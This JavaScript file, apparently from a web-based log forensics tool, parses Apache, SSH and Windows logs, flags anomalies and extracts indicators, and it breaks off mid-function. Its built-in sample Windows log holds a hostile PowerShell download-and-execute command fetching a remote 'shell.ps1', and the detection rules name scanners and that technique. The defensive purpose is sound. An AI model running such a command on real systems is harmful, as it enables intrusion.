import { esc } from '/js/shared.js';

const LF_SAMPLES = {
  apache: `192.168.1.105 - admin [20/Sep/2026:14:23:01 +0000] "GET /admin/dashboard HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
10.0.0.44 - - [20/Sep/2026:14:23:02 +0000] "POST /api/login HTTP/1.1" 401 112 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:23:03 +0000] "POST /api/login HTTP/1.1" 401 112 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:23:03 +0000] "POST /api/login HTTP/1.1" 401 112 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:23:04 +0000] "POST /api/login HTTP/1.1" 401 112 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:23:04 +0000] "POST /api/login HTTP/1.1" 200 1843 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:23:05 +0000] "GET /admin/users HTTP/1.1" 200 8921 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:23:06 +0000] "GET /admin/export?table=users HTTP/1.1" 200 245102 "-" "python-requests/2.28.1"
203.0.113.42 - - [20/Sep/2026:14:23:07 +0000] "GET /wp-admin HTTP/1.1" 404 234 "-" "Mozlila/5.0 (compatible; Nmap Scripting Engine)"
203.0.113.42 - - [20/Sep/2026:14:23:07 +0000] "GET /.env HTTP/1.1" 403 199 "-" "Mozlila/5.0 (compatible; Nmap Scripting Engine)"
203.0.113.42 - - [20/Sep/2026:14:23:08 +0000] "GET /phpinfo.php HTTP/1.1" 404 234 "-" "Mozlila/5.0 (compatible; Nmap Scripting Engine)"
192.168.1.10 - jdoe [20/Sep/2026:14:23:09 +0000] "GET /reports/q3-financials.pdf HTTP/1.1" 200 1048576 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X)"
172.16.0.5 - - [20/Sep/2026:14:24:01 +0000] "GET / HTTP/1.1" 200 3421 "-" "curl/7.88.1"
10.0.0.44 - - [20/Sep/2026:14:24:02 +0000] "DELETE /admin/users/15 HTTP/1.1" 200 45 "-" "python-requests/2.28.1"
10.0.0.44 - - [20/Sep/2026:14:24:03 +0000] "PUT /admin/config HTTP/1.1" 200 89 "-" "python-requests/2.28.1"`,
  auth: `Sep 20 14:20:01 web-srv-01 sshd[4421]: Failed password for root from 185.220.101.34 port 44312 ssh2
Sep 20 14:20:02 web-srv-01 sshd[4421]: Failed password for root from 185.220.101.34 port 44312 ssh2
Sep 20 14:20:03 web-srv-01 sshd[4422]: Failed password for admin from 185.220.101.34 port 44315 ssh2
Sep 20 14:20:04 web-srv-01 sshd[4423]: Failed password for admin from 185.220.101.34 port 44318 ssh2
Sep 20 14:20:05 web-srv-01 sshd[4424]: Failed password for root from 185.220.101.34 port 44320 ssh2
Sep 20 14:20:06 web-srv-01 sshd[4425]: Accepted password for deploy from 10.0.0.5 port 52100 ssh2
Sep 20 14:20:07 web-srv-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
Sep 20 14:20:08 web-srv-01 sshd[4430]: Failed password for root from 91.219.237.88 port 33100 ssh2
Sep 20 14:20:09 web-srv-01 sshd[4431]: Failed password for root from 91.219.237.88 port 33102 ssh2
Sep 20 14:20:10 web-srv-01 sshd[4432]: Failed password for ubuntu from 91.219.237.88 port 33105 ssh2
Sep 20 14:20:11 web-srv-01 sshd[4433]: Failed password for test from 91.219.237.88 port 33108 ssh2
Sep 20 14:20:12 web-srv-01 su[4440]: FAILED su for root by deploy
Sep 20 14:20:13 web-srv-01 su[4441]: Successful su for root by deploy
Sep 20 14:20:14 web-srv-01 sshd[4445]: Accepted publickey for backup from 10.0.0.20 port 48200 ssh2
Sep 20 14:20:15 web-srv-01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.34 DST=10.0.0.1 PROTO=TCP DPT=3306`,
  windows: `EventID: 4625 | Time: 2026-09-20T14:15:00Z | Source: Security | User: administrator | Status: Failure | IP: 198.51.100.77 | Logon Type: 10
EventID: 4625 | Time: 2026-09-20T14:15:01Z | Source: Security | User: administrator | Status: Failure | IP: 198.51.100.77 | Logon Type: 10
EventID: 4625 | Time: 2026-09-20T14:15:02Z | Source: Security | User: admin | Status: Failure | IP: 198.51.100.77 | Logon Type: 10
EventID: 4624 | Time: 2026-09-20T14:15:03Z | Source: Security | User: svc-backup | Status: Success | IP: 10.0.0.50 | Logon Type: 3
EventID: 4672 | Time: 2026-09-20T14:15:04Z | Source: Security | User: svc-backup | Status: Success | IP: 10.0.0.50 | Privileges: SeBackupPrivilege
EventID: 4688 | Time: 2026-09-20T14:15:05Z | Source: Security | User: svc-backup | Process: cmd.exe | Parent: services.exe | CommandLine: cmd.exe /c whoami
EventID: 4688 | Time: 2026-09-20T14:15:06Z | Source: Security | User: svc-backup | Process: powershell.exe | Parent: cmd.exe | CommandLine: powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/shell.ps1')
EventID: 4697 | Time: 2026-09-20T14:15:07Z | Source: Security | User: svc-backup | ServiceName: WindowsUpdate2 | ServiceFile: C:\\Windows\\Temp\\svc.exe
EventID: 4720 | Time: 2026-09-20T14:15:08Z | Source: Security | User: svc-backup | TargetUser: support$ | Status: Account Created
EventID: 4732 | Time: 2026-09-20T14:15:09Z | Source: Security | User: svc-backup | Group: Administrators | Member: support$`
};

function detectFormat(text) {
  var lines = text.trim().split('\n').filter(Boolean);
  if (!lines.length) return { format: 'unknown', confidence: 0 };
  var apacheRe = /^\d+\.\d+\.\d+\.\d+\s+-\s+\S+\s+\[.+\]\s+"[A-Z]+\s/;
  var authRe = /^\w{3}\s+\d+\s+\d+:\d+:\d+\s+\S+\s+(sshd|sudo|su|kernel)/;
  var winRe = /^EventID:\s*\d+/;
  var jsonRe = /^\s*[\[{]/;
  var apacheCount = 0, authCount = 0, winCount = 0, jsonCount = 0;
  var sample = lines.slice(0, Math.min(lines.length, 10));
  sample.forEach(function(l) {
    if (apacheRe.test(l)) apacheCount++;
    if (authRe.test(l)) authCount++;
    if (winRe.test(l)) winCount++;
    if (jsonRe.test(l)) jsonCount++;
  });
  var total = sample.length;
  var best = Math.max(apacheCount, authCount, winCount, jsonCount);
  if (best === 0) return { format: 'unknown', confidence: 0 };
  if (apacheCount === best) return { format: 'apache', confidence: Math.round(apacheCount / total * 100) };
  if (authCount === best) return { format: 'auth', confidence: Math.round(authCount / total * 100) };
  if (winCount === best) return { format: 'windows', confidence: Math.round(winCount / total * 100) };
  return { format: 'json', confidence: Math.round(jsonCount / total * 100) };
}

function parseApache(line) {
  var m = line.match(/^(\S+)\s+-\s+(\S+)\s+\[(.+?)\]\s+"(\S+)\s+(\S+)\s+\S+"\s+(\d+)\s+(\d+)\s+"([^"]*)"\s+"([^"]*)"/);
  if (!m) return null;
  return { ip: m[1], user: m[2] === '-' ? '' : m[2], time: m[3], method: m[4], path: m[5], status: parseInt(m[6]), size: parseInt(m[7]), referer: m[8], agent: m[9], raw: line };
}

function parseAuth(line) {
  var m = line.match(/^(\w{3}\s+\d+\s+\d+:\d+:\d+)\s+(\S+)\s+(\S+?)(?:\[(\d+)\])?:\s+(.+)/);
  if (!m) return null;
  var msg = m[5];
  var severity = 'info';
  if (/Failed|FAILED|BLOCK/.test(msg)) severity = 'error';
  else if (/Accepted|Successful/.test(msg)) severity = 'ok';
  else if (/sudo/.test(m[3])) severity = 'warn';
  var ipMatch = msg.match(/from\s+(\d+\.\d+\.\d+\.\d+)/);
  var userMatch = msg.match(/for\s+(\S+)\s+from/) || msg.match(/USER=(\S+)/) || msg.match(/by\s+(\S+)/);
  return { time: m[1], host: m[2], service: m[3], pid: m[4] || '', message: msg, severity: severity, ip: ipMatch ? ipMatch[1] : '', user: userMatch ? userMatch[1] : '', raw: line };
}

function parseWindows(line) {
  var fields = {};
  line.split('|').forEach(function(p) {
    var kv = p.trim().split(/:\s*(.+)/);
    if (kv.length >= 2) fields[kv[0].trim()] = kv[1].trim();
  });
  var severity = 'info';
  if (fields.Status === 'Failure') severity = 'error';
  else if (/4672|4688|4697|4720|4732/.test(fields.EventID)) severity = 'warn';
  else if (fields.Status === 'Success') severity = 'ok';
  return { eventId: fields.EventID || '', time: fields.Time || '', source: fields.Source || '', user: fields.User || '', status: fields.Status || '', ip: fields.IP || '', severity: severity, extra: fields, raw: line };
}

function parseEntries(text, format) {
  var lines = text.trim().split('\n').filter(Boolean);
  var entries = [];
  lines.forEach(function(l, i) {
    var e = null;
    if (format === 'apache') e = parseApache(l);
    else if (format === 'auth') e = parseAuth(l);
    else if (format === 'windows') e = parseWindows(l);
    if (e) { e.index = i; entries.push(e); }
  });
  return entries;
}

function findAnomalies(entries, format) {
  var anomalies = [];
  if (format === 'apache') {
    var ipCounts = {};
    var failedByIp = {};
    entries.forEach(function(e) {
      ipCounts[e.ip] = (ipCounts[e.ip] || 0) + 1;
      if (e.status === 401 || e.status === 403) failedByIp[e.ip] = (failedByIp[e.ip] || 0) + 1;
    });
    Object.keys(failedByIp).forEach(function(ip) {
      if (failedByIp[ip] >= 3) anomalies.push({ type: 'Brute Force', severity: 'critical', detail: ip + ' had ' + failedByIp[ip] + ' failed auth attempts', ip: ip });
    });
    entries.forEach(function(e) {
      if (e.size > 100000) anomalies.push({ type: 'Large Transfer', severity: 'high', detail: e.path + ' served ' + (e.size / 1024).toFixed(0) + ' KB to ' + e.ip, ip: e.ip });
      if (/Nmap|nikto|sqlmap|dirbuster|gobuster/i.test(e.agent)) anomalies.push({ type: 'Scanner Detected', severity: 'critical', detail: 'Scanner agent from ' + e.ip + ': ' + e.agent, ip: e.ip });
      if (/\.env|phpinfo|wp-admin|\.git|\.bak/i.test(e.path)) anomalies.push({ type: 'Sensitive Path Probe', severity: 'high', detail: e.ip + ' probed ' + e.path, ip: e.ip });
      if (/DELETE|PUT/.test(e.method) && /admin/.test(e.path)) anomalies.push({ type: 'Admin Mutation', severity: 'high', detail: e.ip + ' ' + e.method + ' ' + e.path, ip: e.ip });
    });
  } else if (format === 'auth') {
    var failedSsh = {};
    entries.forEach(function(e) {
      if (/Failed password/.test(e.message)) failedSsh[e.ip] = (failedSsh[e.ip] || 0) + 1;
      if (e.service === 'sudo' && /USER=root/.test(e.message)) anomalies.push({ type: 'Privilege Escalation', severity: 'critical', detail: e.user + ' escalated to root via sudo', ip: '' });
      if (/Successful su for root/.test(e.message)) anomalies.push({ type: 'Root Access', severity: 'critical', detail: 'su to root succeeded', ip: '' });
      if (/UFW BLOCK/.test(e.message)) anomalies.push({ type: 'Firewall Block', severity: 'medium', detail: 'Blocked traffic from ' + e.ip, ip: e.ip });
    });
    Object.keys(failedSsh).forEach(function(ip) {
      if (failedSsh[ip] >= 3) anomalies.push({ type: 'SSH Brute Force', severity: 'critical', detail: ip + ': ' + failedSsh[ip] + ' failed SSH attempts', ip: ip });
    });
  } else if (format === 'windows') {
    entries.forEach(function(e) {
      if (e.eventId === '4625') anomalies.push({ type: 'Failed Logon', severity: 'high', detail: 'Failed logon for ' + e.user + ' from ' + e.ip, ip: e.ip });
      if (e.eventId === '4672') anomalies.push({ type: 'Privilege Assignment', severity: 'high', detail: 'Special privileges assigned to ' + e.user, ip: e.ip });
      if (e.eventId === '4697') anomalies.push({ type: 'Service Install', severity: 'critical', detail: 'Service installed by ' + e.user + ': ' + (e.extra.ServiceName || ''), ip: '' });
      if (e.eventId === '4720') anomalies.push({ type: 'Account Created', severity: 'critical', detail: 'New account ' + (e.extra.TargetUser || '') + ' created by ' + e.user, ip: '' });
      if (e.eventId === '4732') anomalies.push({ type: 'Admin Group Change', severity: 'critical', detail: (e.extra.Member || '') + ' added to ' + (e.extra.Group || '') + ' by ' + e.user, ip: '' });
      if (e.eventId === '4688' && /powershell.*bypass|downloadstring|iex\(/i.test(e.extra.CommandLine || '')) anomalies.push({ type: 'Suspicious Execution', severity: 'critical', detail: 'PowerShell with bypass: ' + (e.extra.CommandLine || '').slice(0, 120), ip: '' });
    });
  }
  return anomalies;
}

function extractIOCs(entries, format) {
  var ips = {}, agents = {}, paths = {}, codes = {};
  entries.forEach(function(e) {
    var ip = e.ip || '';
    if (ip && !/^(10\.|192\.168\.|172\.(1[6-9]|2|3[01])\.)/.test(ip)) ips[ip] = (ips[ip] || 0) + 1;
    if (format === 'apache') {
      if (e.agent) agents[e.agent] = (agents[e.agent] || 0) + 1;
      if (e.path) paths[e.path] = (paths[e.path] || 0) + 1;
      codes[e.status] = (codes[e.status] || 0) + 1;
    }
  });
  return { ips: ips, agents: agents, paths: paths, codes: codes };
}

function sevColor(sev) {
  var m = { critical: '#dc2626', high: '#f97316', medium: '#eab308', low: '#22c55e', info: '#64748b', error: '#dc2626', warn: '#f97316', ok: '#16a34a' };
  return m[sev] || '#64748b';
}

export function renderLogForensics(container) {
  var state = { tab: 'input', entries: [], format: 'unknown', confidence: 0, anomalies: [], iocs: {}, text: '' };

  var CSS = '<style>' +
    '.lf-wrap{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;color:var(--txt,#c8d6e5)}' +
    '.lf-header{margin-bottom:24px}' +
    '.lf-title{font-size:1.5rem;font-weight:700;margin:0 0 6px}' +
    '.lf-sub{color:var(--mut,#64748b);font-size:.85rem}' +
    '.lf-tabs{display:flex;gap:4px;margin-bottom:20px;flex-wrap:wrap}' +
    '.lf-tab{padding:8px 16px;border:1px solid var(--line,#1e293b);border-radius:4px;background:transparent;color:var(--mut,#8899aa);cursor:pointer;font-size:.78rem;font-weight:600;text-transform:uppercase;letter-spacing:.04em;transition:all .15s;font-family:inherit}' +
    '.lf-tab:hover{background:rgba(255,255,255,.05);color:var(--txt)}' +
    '.lf-tab.active{background:var(--acc,#2563eb);color:#fff;border-color:var(--acc,#2563eb)}' +
    '.lf-panel{background:var(--card,#0d1117);border:1px solid var(--line,#1e293b);border-radius:8px;padding:20px;margin-bottom:16px}' +
    '.lf-textarea{width:100%;min-height:260px;background:var(--card2,#080c14);border:1px solid var(--line,#1e293b);border-radius:6px;color:var(--txt,#e2e8f0);font-family:ui-monospace,monospace;font-size:.78rem;padding:14px;resize:vertical;line-height:1.6}' +
    '.lf-textarea:focus{border-color:var(--acc);outline:none}' +
    '.lf-samples{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}' +
    '.lf-sample-btn{padding:5px 12px;border:1px solid var(--line,#1e293b);border-radius:4px;background:transparent;color:var(--mut);cursor:pointer;font-size:.72rem;font-family:inherit;transition:all .15s}' +
    '.lf-sample-btn:hover{border-color:var(--acc);color:var(--acc)}' +
    '.lf-detect{display:flex;align-items:center;gap:12px;margin:12px 0;font-size:.8rem}' +
    '.lf-detect-badge{padding:3px 10px;border-radius:4px;font-weight:700;font-size:.72rem;text-transform:uppercase;letter-spacing:.04em}' +
    '.lf-conf-bar{height:6px;border-radius:3px;background:var(--line,#1e293b);flex:1;max-width:200px;overflow:hidden}' +
    '.lf-conf-fill{height:100%;border-radius:3px;transition:width .3s}' +
    '.lf-btn{padding:7px 16px;border:none;border-radius:4px;background:var(--acc,#2563eb);color:#fff;cursor:pointer;font-size:.78rem;font-weight:600;font-family:inherit;transition:all .15s}' +
    '.lf-btn:hover{opacity:.9}' +
    '.lf-btn-ghost{background:transparent;border:1px solid var(--line);color:var(--mut)}' +
    '.lf-btn-ghost:hover{border-color:var(--acc);color:var(--acc)}' +
    '.lf-table{width:100%;border-collapse:collapse;font-size:.75rem}' +
    '.lf-table th{text-align:left;padding:8px 10px;border-bottom:2px solid var(--line);color:var(--mut);font-weight:600;text-transform:uppercase;letter-spacing:.04em;font-size:.68rem;cursor:pointer}' +
    '.lf-table th:hover{color:var(--acc)}' +
    '.lf-table td{padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}' +
    '.lf-table tr:hover td{background:rgba(255,255,255,.02)}' +
    '.lf-sev{display:inline-block;padding:2px 6px;border-radius:3px;font-size:.65rem;font-weight:700;text-transform:uppercase;letter-spacing:.03em}' +
    '.lf-timeline{position:relative;height:120px;background:var(--card2,#080c14);border:1px solid var(--line);border-radius:6px;margin:16px 0;overflow:hidden}' +
    '.lf-tl-dot{position:absolute;width:8px;height:8px;border-radius:50%;transform:translate(-50%,-50%);cursor:pointer;transition:transform .15s}' +
    '.lf-tl-dot:hover{transform:translate(-50%,-50%) scale(1.8);z-index:5}' +
    '.lf-tl-label{position:absolute;bottom:4px;font-size:.6rem;color:var(--mut);transform:translateX(-50%)}' +
    '.lf-stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-bottom:16px}' +
    '.lf-stat-card{background:var(--card2,#080c14);border:1px solid var(--line);border-radius:8px;padding:16px}' +
    '.lf-stat-val{font-size:1.4rem;font-weight:800;color:var(--acc,#2563eb);font-variant-numeric:tabular-nums}' +
    '.lf-stat-label{font-size:.68rem;color:var(--mut);text-transform:uppercase;letter-spacing:.04em;margin-top:4px}' +
    '.lf-anom{border-left:3px solid;padding:10px 14px;margin-bottom:8px;border-radius:0 6px 6px 0;background:rgba(0,0,0,.15);font-size:.78rem}' +
    '.lf-ioc-list{display:flex;flex-direction:column;gap:4px;max-height:300px;overflow-y:auto}' +
    '.lf-ioc-item{display:flex;justify-content:space-between;align-items:center;padding:6px 10px;border-radius:4px;font-size:.75rem;font-family:ui-monospace,monospace}' +
    '.lf-ioc-item:hover{background:rgba(255,255,255,.03)}' +
    '.lf-ioc-count{font-weight:700;color:var(--acc);min-width:30px;text-align:right}' +
    '.lf-empty{text-align:center;padding:40px;color:var(--mut);font-size:.85rem}' +
    '[data-style=pro] .lf-wrap{color:#0f172a}' +
    '[data-style=pro] .lf-panel{background:#fff;border-color:#e2e8f0}' +
    '[data-style=pro] .lf-textarea{background:#f8fafc;border-color:#e2e8f0;color:#0f172a}' +
    '[data-style=pro] .lf-table td{border-bottom-color:#f1f5f9;color:#334155}' +
    '[data-style=pro] .lf-table th{border-bottom-color:#e2e8f0;color:#64748b}' +
    '[data-style=pro] .lf-table tr:hover td{background:#f8fafc}' +
    '[data-style=pro] .lf-stat-card{background:#f8fafc;border-color:#e2e8f0}' +
    '[data-style=pro] .lf-timeline{background:#f8fafc;border-color:#e2e8f0}' +
    '[data-style=pro] .lf-anom{background:#fafafa}' +
    '[data-style=pro] .lf-tab{border-color:#e2e8f0;color:#64748b}' +
    '[data-style=pro] .lf-tab:hover{background:#f1f5f9;color:#0f172a}' +
    '[data-style=pro] .lf-tab.active{background:#2563eb;color:#fff;border-color:#2563eb}' +
    '[data-style=pro] .lf-sample-btn{border-color:#e2e8f0;color:#64748b}' +
    '[data-style=pro] .lf-sample-btn:hover{border-color:#2563eb;color:#2563eb}' +
    '[data-style=pro] .lf-ioc-item:hover{background:#f1f5f9}' +
    '[data-style=pro] .lf-conf-bar{background:#e2e8f0}' +
    '</style>';

  function render() {
    var tabs = [
      { id: 'input', label: 'Input' },
      { id: 'parsed', label: 'Parsed View' },
      { id: 'timeline', label: 'Timeline' },
      { id: 'anomalies', label: 'Anomalies (' + state.anomalies.length + ')' },
      { id: 'stats', label: 'Statistics' }
    ];

    var html = CSS + '<div class="lf-wrap">' +
      '<div class="lf-header"><h1 class="lf-title">Log Forensics Engine</h1><p class="lf-sub">Paste logs to auto-detect format, parse entries, find anomalies, and extract IOCs</p></div>' +
      '<div class="lf-tabs">' + tabs.map(function(t) { return '<button class="lf-tab' + (state.tab === t.id ? ' active' : '') + '" data-tab="' + t.id + '">' + t.label + '</button>'; }).join('') + '</div>';

    if (state.tab === 'input') html += renderInput();
    else if (state.tab === 'parsed') html += renderParsed();
    else if (state.tab === 'timeline') html += renderTimeline();
    else if (state.tab === 'anomalies') html += renderAnomalies();
    else if (state.tab === 'stats') html += renderStats();

    html += '</div>';
    container.innerHTML = html;
    wireEvents();
  }

  function renderInput() {
    var h = '<div class="lf-panel">' +
      '<div class="lf-samples"><span style="font-size:.72rem;color:var(--mut);margin-right:4px">Load sample:</span>' +
      '<button class="lf-sample-btn" data-sample="apache">Apache Access Log</button>' +
      '<button class="lf-sample-btn" data-sample="auth">SSH Auth Log</button>' +
      '<button class="lf-sample-btn" data-sample="windows">Windows Security</button></div>' +
      '<textarea class="lf-textarea" id="lf-input" placeholder="Paste log data here (syslog, Apache, nginx, auth.log, Windows Event logs, JSON)...">' + esc(state.text) + '</textarea>';
    if (state.format !== 'unknown') {
      var confColor = state.confidence >= 80 ? '#16a34a' : state.confidence >= 50 ? '#eab308' : '#dc2626';
      h += '<div class="lf-detect">' +
        '<span class="lf-detect-badge" style="background:' + confColor + '22;color:' + confColor + '">' + esc(state.format.toUpperCase()) + '</span>' +
        '<span style="font-size:.72rem;color:var(--mut)">Confidence:</span>' +
        '<div class="lf-conf-bar"><div class="lf-conf-fill" style="width:' + state.confidence + '%;background:' + confColor + '"></div></div>' +
        '<span style="font-size:.72rem;font-weight:700;color:' + confColor + '">' + state.confidence + '%</span>' +
        '<span style="flex:1"></span>' +
        '<span style="font-size:.72rem;color:var(--mut)">' + state.entries.length + ' entries parsed</span>' +
        '</div>';
    }
    h += '<div style="display:flex;gap:8px;margin-top:12px">' +
      '<button class="lf-btn" id="lf-parse">Analyze Logs</button>' +
      '<button class="lf-btn lf-btn-ghost" id="lf-clear">Clear</button></div>' +
      '</div>';
    return h;
  }

  function renderParsed() {
    if (!state.entries.length) return '<div class="lf-empty">No parsed entries yet. Go to Input tab and paste some logs.</div>';
    var h = '<div class="lf-panel" style="overflow-x:auto">';
    if (state.format === 'apache') {
      h += '<table class="lf-table"><thead><tr><th>#</th><th>IP</th><th>User</th><th>Method</th><th>Path</th><th>Status</th><th>Size</th><th>Agent</th></tr></thead><tbody>';
      state.entries.forEach(function(e, i) {
        var sc = e.status >= 400 ? '#dc2626' : e.status >= 300 ? '#eab308' : '#16a34a';
        h += '<tr><td>' + (i + 1) + '</td><td style="font-family:monospace">' + esc(e.ip) + '</td><td>' + esc(e.user || '-') + '</td><td><span style="color:var(--acc)">' + esc(e.method) + '</span></td><td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + esc(e.path) + '</td><td><span class="lf-sev" style="background:' + sc + '22;color:' + sc + '">' + e.status + '</span></td><td>' + (e.size > 1024 ? (e.size / 1024).toFixed(1) + 'K' : e.size) + '</td><td style="max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:.68rem;color:var(--mut)">' + esc(e.agent) + '</td></tr>';
      });
      h += '</tbody></table>';
    } else if (state.format === 'auth') {
      h += '<table class="lf-table"><thead><tr><th>#</th><th>Time</th><th>Host</th><th>Service</th><th>Severity</th><th>IP</th><th>User</th><th>Message</th></tr></thead><tbody>';
      state.entries.forEach(function(e, i) {
        h += '<tr><td>' + (i + 1) + '</td><td style="white-space:nowrap">' + esc(e.time) + '</td><td>' + esc(e.host) + '</td><td>' + esc(e.service) + '</td><td><span class="lf-sev" style="background:' + sevColor(e.severity) + '22;color:' + sevColor(e.severity) + '">' + esc(e.severity) + '</span></td><td style="font-family:monospace">' + esc(e.ip) + '</td><td>' + esc(e.user) + '</td><td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + esc(e.message) + '</td></tr>';
      });
      h += '</tbody></table>';
    } else if (state.format === 'windows') {
      h += '<table class="lf-table"><thead><tr><th>#</th><th>Event ID</th><th>Time</th><th>User</th><th>Status</th><th>IP</th><th>Details</th></tr></thead><tbody>';
      state.entries.forEach(function(e, i) {
        var det = Object.keys(e.extra).filter(function(k) { return !['EventID','Time','Source','User','Status','IP'].includes(k); }).map(function(k) { return k + ': ' + e.extra[k]; }).join(', ');
        h += '<tr><td>' + (i + 1) + '</td><td style="font-weight:700">' + esc(e.eventId) + '</td><td style="white-space:nowrap">' + esc(e.time) + '</td><td>' + esc(e.user) + '</td><td><span class="lf-sev" style="background:' + sevColor(e.severity) + '22;color:' + sevColor(e.severity) + '">' + esc(e.status || e.severity) + '</span></td><td style="font-family:monospace">' + esc(e.ip) + '</td><td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:.7rem">' + esc(det) + '</td></tr>';
      });
      h += '</tbody></table>';
    }
    h += '</div>';
    return h;
  }

  function renderTimeline() {
    if (!state.entries.length) return '<div class="lf-empty">No entries to visualize. Parse logs first.</div>';
    var h = '<div class="lf-panel"><h3 style="margin:0 0 12px;font-size:.85rem">Event Timeline</h3>';
    h += '<div class="lf-timeline" id="lf-tl">';
    var total = state.entries.length;
    state.entries.forEach(function(e, i) {
      var x = (i / Math.max(total - 1, 1)) * 95 + 2.5;
      var y = 20 + Math.random() * 60;
      var sev = e.severity || (e.status >= 400 ? 'error' : e.status >= 300 ? 'warn' : 'ok');
      var col = sevColor(sev);
      h += '<div class="lf-tl-dot" style="left:' + x + '%;top:' + y + '%;background:' + col + ';box-shadow:0 0 6px ' + col + '" title="' + esc(e.raw || '').slice(0, 100) + '"></div>';
    });
    var labels = ['Start', '', '', '', 'End'];
    labels.forEach(function(l, i) {
      if (l) h += '<span class="lf-tl-label" style="left:' + (i / (labels.length - 1) * 95 + 2.5) + '%">' + l + '</span>';
    });
    h += '</div>';
    h += '<div style="display:flex;gap:16px;margin-top:10px;font-size:.7rem">' +
      '<span style="color:#16a34a">&#9679; OK/Success</span>' +
      '<span style="color:#eab308">&#9679; Warning</span>' +
      '<span style="color:#dc2626">&#9679; Error/Critical</span>' +
      '<span style="color:#64748b">&#9679; Info</span></div>';
    h += '</div>';
    return h;
  }

  function renderAnomalies() {
    if (!state.anomalies.length) return '<div class="lf-empty">No anomalies detected. Parse logs first or load a sample with attack patterns.</div>';
    var h = '<div class="lf-panel">' +
      '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px"><h3 style="margin:0;font-size:.85rem">Detected Anomalies</h3><span style="font-size:.72rem;color:var(--mut)">' + state.anomalies.length + ' findings</span></div>';
    state.anomalies.forEach(function(a) {
      h += '<div class="lf-anom" style="border-left-color:' + sevColor(a.severity) + '">' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">' +
        '<span class="lf-sev" style="background:' + sevColor(a.severity) + '22;color:' + sevColor(a.severity) + '">' + esc(a.severity) + '</span>' +
        '<strong style="font-size:.8rem">' + esc(a.type) + '</strong>' +
        (a.ip ? '<code style="font-size:.7rem;color:var(--acc);margin-left:auto">' + esc(a.ip) + '</code>' : '') +
        '</div>' +
        '<div style="font-size:.75rem;color:var(--mut)">' + esc(a.detail) + '</div></div>';
    });
    h += '</div>';
    return h;
  }

  function renderStats() {
    if (!state.entries.length) return '<div class="lf-empty">No data for statistics. Parse logs first.</div>';
    var iocs = state.iocs;
    var h = '<div class="lf-stat-grid">' +
      '<div class="lf-stat-card"><div class="lf-stat-val">' + state.entries.length + '</div><div class="lf-stat-label">Total Entries</div></div>' +
      '<div class="lf-stat-card"><div class="lf-stat-val">' + state.anomalies.length + '</div><div class="lf-stat-label">Anomalies</div></div>' +
      '<div class="lf-stat-card"><div class="lf-stat-val">' + Object.keys(iocs.ips || {}).length + '</div><div class="lf-stat-label">External IPs</div></div>' +
      '<div class="lf-stat-card"><div class="lf-stat-val" style="color:#dc2626">' + state.anomalies.filter(function(a) { return a.severity === 'critical'; }).length + '</div><div class="lf-stat-label">Critical Findings</div></div>' +
      '</div>';
    if (Object.keys(iocs.ips || {}).length) {
      h += '<div class="lf-panel"><h3 style="margin:0 0 10px;font-size:.85rem">External IPs (IOCs)</h3><div class="lf-ioc-list">';
      var sorted = Object.entries(iocs.ips).sort(function(a, b) { return b[1] - a[1]; });
      sorted.forEach(function(p) {
        h += '<div class="lf-ioc-item"><span>' + esc(p[0]) + '</span><span class="lf-ioc-count">' + p[1] + '</span></div>';
      });
      h += '</div></div>';
    }
    if (Object.keys(iocs.codes || {}).length) {
      h += '<div class="lf-panel"><h3 style="margin:0 0 10px;font-size:.85rem">HTTP Status Codes</h3><div class="lf-ioc-list">';
      Object.entries(iocs.codes).sort(function(a, b) { return b[1] - a[1]; }).forEach(function(p) {
        var c = parseInt(p[0]) >= 400 ? '#dc2626' : parseInt(p[0]) >= 300 ? '#eab308' : '#16a34a';
        h += '<div class="lf-ioc-item"><span style="color:' + c + ';font-weight:700">' + esc(p[0]) + '</span><span class="lf-ioc-count">' + p[1] + '</span></div>';
      });
      h += '</div></div>';
    }
    if (Object.keys(iocs.agents || {}).length) {
      h += '<div class="lf-panel"><h3 style="margin:0 0 10px;font-size:.85rem">User Agents</h3><div class="lf-ioc-list">';
      Object.entries(iocs.agents).sort(function(a, b) { return b[1] - a[1]; }).forEach(function(p) {
        var suspicious = /Nmap|nikto|sqlmap|python-requests|curl|dirbuster|gobuster/i.test(p[0]);
        h += '<div class="lf-ioc-item"><span style="' + (suspicious ? 'color:#dc2626;font-weight:600' : '') + '">' + esc(p[0]) + '</span><span class="lf-ioc-count">' + p[1] + '</span></div>';
      });
      h += '</div></div>';
    }
    return h;
  }

  function doAnalyze() {
    var el = container.querySelector('#lf-input');
    if (!el) return;
    state.text = el.value.trim();
    if (!state.text) return;
    var det = detectFormat(state.text);
    state.format = det.format;
    state.confidence = det.confidence;
    state.entries = parseEntries(state.text, state.format);
    state.anomalies = findAnomalies(state.entries, state.format);
    state.iocs = extractIOCs(state.entries, state.format);
    state.tab = 'parsed';
    render();
  }

  function wireEvents() {
    container.querySelectorAll('.lf-tab').forEach(function(btn) {
      btn.onclick = function() { state.tab = btn.dataset.tab; render(); };
    });
    container.querySelectorAll('.lf-sample-btn').forEach(function(btn) {
      btn.onclick = function() {
        var s = LF_SAMPLES[btn.dataset.sample] || '';
        state.text = s;
        var el = container.querySelector('#lf-input');
